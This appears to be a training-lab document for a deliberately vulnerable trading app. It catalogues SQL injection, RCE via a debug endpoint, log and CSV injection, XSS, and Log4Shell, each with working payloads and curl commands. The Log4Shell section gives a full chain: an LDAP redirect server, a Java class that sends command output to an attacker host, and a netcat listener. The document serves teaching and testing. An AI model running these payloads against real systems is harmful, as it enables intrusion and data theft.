# 03 — Injection

## Overview
VulnTrade has injection vulnerabilities across multiple channels: traditional REST SQL injection, SQL injection over WebSocket/STOMP (a rare and often missed attack surface), Remote Code Execution via a debug endpoint, log injection, and CSV formula injection. The WebSocket SQLi is particularly noteworthy — WAFs typically cannot inspect STOMP frames.

---

## Vulnerabilities

### INJ-01: SQL Injection — Legacy Login Endpoint (Blind / Error-Based)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | `POST /api/auth/login-legacy` |
| File | `AuthController.java:143` |

**Description:** Username is concatenated directly into SQL: `"SELECT * FROM users WHERE username = '" + username + "'"` (`AuthController.java:143`), executed via `createNativeQuery` (line 144). The query is fully injectable, **but it is not an authentication bypass**: the app bcrypt-verifies the supplied password against the returned row (line 155), so `' OR '1'='1 --` matches a row and is still rejected on the password check. Exploit it instead as a **boolean-blind oracle** plus an **error-based** channel for data extraction.

**How to exploit (boolean-blind oracle):**
```bash
# TRUE  predicate: username = trader1' AND '1'='1  -> row matches -> bcrypt fails -> "Invalid password"
# FALSE predicate: username = trader1' AND '1'='2  -> no row                     -> "User not found"
curl -X POST http://localhost:8085/api/auth/login-legacy \
  -H "Content-Type: application/json" \
  --data-raw '{"username":"trader1'\'' AND '\''1'\''='\''1","password":"x"}'   # => "Invalid password"

curl -X POST http://localhost:8085/api/auth/login-legacy \
  -H "Content-Type: application/json" \
  --data-raw '{"username":"trader1'\'' AND '\''1'\''='\''2","password":"x"}'   # => "User not found"
```
Swap the predicate for `SUBSTRING((SELECT flag_value FROM flags LIMIT 1),1,1)='F'` etc. to extract data character by character — the two distinct replies are the oracle.

**How to exploit (error-based):**
```bash
# Unbalanced quote -> broken SQL grammar -> HTTP 500 leaking org.hibernate ... SQLGrammarException
curl -X POST http://localhost:8085/api/auth/login-legacy \
  -H "Content-Type: application/json" \
  --data-raw '{"username":"trader1'\''","password":"x"}'
```

> The `' OR 1=1 --` / UNION-SELECT framing from earlier docs is retained here only as history: the password re-check neutralises the bypass, and a UNION row is likewise fed through the bcrypt check, so the reliable exfiltration channels are the blind oracle and the error-based response above. See [AUTH-02](01-authentication.md) for the same endpoint from the authentication angle.

---

### INJ-02: SQL Injection — WebSocket Trade History (startDate)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | WebSocket `/app/trade.getHistory` |
| File | `CustomQueryRepository.java:33` |

**Description:** The `startDate` parameter is concatenated into SQL: `" AND t.executed_at >= '" + startDate + "'"`. This is injectable over STOMP WebSocket — a vector that WAFs typically miss.

**How to exploit (via UI):**
1. Go to History page
2. In "Start Date" field, enter: `2020-01-01' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --`
3. Click "Load via WebSocket"
4. Results appear in the trades table

**How to exploit (via Burp Suite):**
Intercept the WebSocket SEND frame and modify the `startDate` field in the JSON body.

See [../websocket-sqli-guide.md](../websocket-sqli-guide.md) for detailed STOMP SQLi techniques.

---

### INJ-03: SQL Injection — WebSocket Trade History (endDate)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | WebSocket `/app/trade.getHistory` |
| File | `CustomQueryRepository.java:36` |

**Description:** Same as INJ-02 but via the `endDate` parameter.

---

### INJ-04: SQL Injection — WebSocket Trade History (symbol)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | WebSocket `/app/trade.getHistory` |
| File | `CustomQueryRepository.java:39` |

**Description:** The `symbol` parameter: `" AND t.symbol = '" + symbol + "'"`.

**Example payload (in Symbol field):**
```
' UNION SELECT 1, table_name::text, 3, 4, now() FROM information_schema.tables WHERE table_schema='public' --
```

---

### INJ-05: SQL Injection — Admin Query Executor
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Beginner |
| Endpoint | `POST /api/admin/execute-query` |
| File | `CustomQueryRepository.java:55` |

**Description:** Executes raw SQL queries directly. While intended for admin use only, the admin role is forgeable via JWT tampering.

---

### INJ-06: Remote Code Execution (RCE) via Debug Endpoint
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-78 |
| Difficulty | Advanced |
| Endpoint | `POST /api/debug/execute` |
| File | `DebugController.java:79` |

**Description:** Executes OS commands via `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",command})` (`DebugController.java:79`). Protected only by a hardcoded debug key (`vulntrade-debug-key-2024`, `DebugController.java:27`) that's discoverable in the source code and config files; a wrong key returns 403.

**How to exploit:**
```bash
curl -X POST http://localhost:8085/api/debug/execute \
  -H "X-Debug-Key: vulntrade-debug-key-2024" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /opt/flags/flag5.txt"}'
# Returns: FLAG{rc3_f1l3syst3m_4cc3ss}
```

---

### INJ-07: Log Injection via Reason Field
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A03: Injection |
| CWE | CWE-117 |
| Difficulty | Intermediate |
| Endpoint | `POST /api/admin/adjust-balance` |
| File | `AdminService.java:77` |

**Description:** The `reason` field in balance adjustments is written straight into the log line (`AdminService.java:77`) and the audit trail without sanitization. Newline characters inject fake log entries. (Reached with a forged ADMIN role — same weak-secret bypass as INJ-05.)

**Example payload:** `legitimate reason\n[SECURITY] Admin password changed to: hacked123`

---

### INJ-08: CSV Formula Injection via Export
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A03: Injection |
| CWE | CWE-1236 |
| Difficulty | Intermediate |
| Endpoint | `GET /api/export/trades` |

**Description:** Trade data is exported as CSV with no `=+-@` cell escaping. A user-controlled field that lands in a cell — e.g. `clientOrderId` on an order — is written verbatim, so a value like `=HYPERLINK("http://evil.example/?x="&A1,"pwn")` survives into the CSV and executes when opened in Excel/LibreOffice.

---

### INJ-09: Stored XSS via Price Alert Symbol
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A03: Injection |
| CWE | CWE-79 |
| Difficulty | Intermediate |
| Endpoint | WebSocket `/app/trade.setAlert` |
| File | `AlertService.java:56` |

**Description:** Alert symbols are stored without sanitization (`AlertService.setSymbol`, `AlertService.java:56`) and echoed/broadcast to users via WebSocket. A malicious symbol like `<img src=x onerror=alert(1)>` persists and renders in the notification UI. The `ALERT_CREATED` reply echoes the payload back byte-for-byte.

---

### INJ-10: dangerouslySetInnerHTML in Dashboard
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A03: Injection |
| CWE | CWE-79 |
| Difficulty | Intermediate |
| File | `DashboardPage.js:375,379` |

**Description:** Symbol and name values in the market prices table use `dangerouslySetInnerHTML` for rendering (`DashboardPage.js:375,379`; the Price Alerts panel does the same at line 624). If a symbol/name contains HTML/JavaScript, it executes in every user's browser viewing the dashboard. This is a frontend-only sink (verified via a browser/Playwright check; **SKIP** in the backend exploit matrix).

---

### INJ-11: Log4Shell (CVE-2021-44228) via WebSocket
| Field | Value |
|-------|-------|
| Severity | Critical (CVSS 10.0) |
| OWASP | A03: Injection + A06: Vulnerable Components |
| CWE | CWE-917 (Expression Language Injection) |
| CVE | CVE-2021-44228 |
| Difficulty | Advanced |
| Endpoints | WebSocket `/app/admin.haltTrading`, `/app/admin.adjustBalance`, `/app/trade.setAlert` |
| Files | `AdminService.java:104`, `AdminService.java:77`, `AlertService.java:62` |

**Description:** VulnTrade uses Log4j2 2.14.1, which is vulnerable to Log4Shell. User-controlled input (the `reason` field in halt/balance operations, the `symbol` field in alerts) flows directly into `logger.info()` calls. Log4j2 resolves `${jndi:ldap://...}` lookups in log messages, causing JNDI injection and Remote Code Execution.

**Why this is realistic:** Trading platforms log everything for compliance (MiFID II, SOX, SEC Rule 613). The "reason" field for admin operations and trade metadata are natural log targets. Log4Shell in financial services was one of the most impactful real-world exploits of the vulnerability.

**Attack vectors (all via WebSocket STOMP):**

| Vector | STOMP Destination | Payload Field | Log Location |
|--------|-------------------|---------------|-------------|
| Halt Trading | `/app/admin.haltTrading` | `reason` | `AdminService.java:104` |
| Balance Adjustment | `/app/admin.adjustBalance` | `reason` | `AdminService.java:77` |
| Price Alert | `/app/trade.setAlert` | `symbol` | `AlertService.java:62` |
| Login (username) | `POST /api/auth/login` | `username` | `AuthController.java` |

**How to exploit (full walkthrough):**

**Step 1: Set up the attacker infrastructure**
```bash
# Terminal 1: Start marshalsec LDAP redirect server
# (redirects JNDI lookup to your HTTP server)
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://YOUR_IP:8888/#Exploit"

# Terminal 2: Start HTTP server hosting the exploit class
python3 -m http.server 8888
```

**Step 2: Create the exploit class**
```java
// Exploit.java — reads the Log4Shell flag
import java.io.*;
public class Exploit {
  static {
    try {
      Process p = Runtime.getRuntime().exec("cat /opt/flags/flag_log4shell.txt");
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      while ((line = br.readLine()) != null) {
        // Exfiltrate via DNS, HTTP callback, or write to a shared location
        new java.net.URL("http://YOUR_IP:9999/" + line).openStream();
      }
    } catch (Exception e) { e.printStackTrace(); }
  }
}
```
```bash
javac Exploit.java  # Compile with Java 11 to match target
```

**Step 3: Trigger Log4Shell via WebSocket**
```javascript
// In browser console (already authenticated, WS connected):
sendMessage('/app/admin.haltTrading', {
  symbol: 'AAPL',
  reason: '${jndi:ldap://YOUR_IP:1389/Exploit}'
});
```

**Step 4: Receive the flag**
```bash
# Terminal 3: Listen for the callback
nc -lvp 9999
# Receives: GET /FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm} HTTP/1.1
```

**Alternative: simpler detection test (no full RCE)**
```javascript
// Test if Log4Shell fires by watching backend logs for JNDI connection attempt
sendMessage('/app/admin.haltTrading', {
  symbol: 'AAPL',
  reason: '${jndi:ldap://127.0.0.1:1389/test}'
});
// Check: docker logs vulntrade-backend | grep -i "jndi"
```

**Flag:** `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}` (in `/opt/flags/flag_log4shell.txt`)

**What you learn:**
- Log4Shell is not limited to HTTP headers (User-Agent) — any user-controlled data that reaches a Log4j2 logger call is exploitable
- WebSocket/STOMP is an overlooked attack surface for Log4Shell
- Financial platforms log extensively for compliance — creating a massive Log4Shell attack surface
- WAFs cannot inspect STOMP frames, making WebSocket Log4Shell especially dangerous

**Remediation:** Upgrade to Log4j2 >= 2.17.1, or set `log4j2.formatMsgNoLookups=true`, or remove `JndiLookup.class` from the classpath.
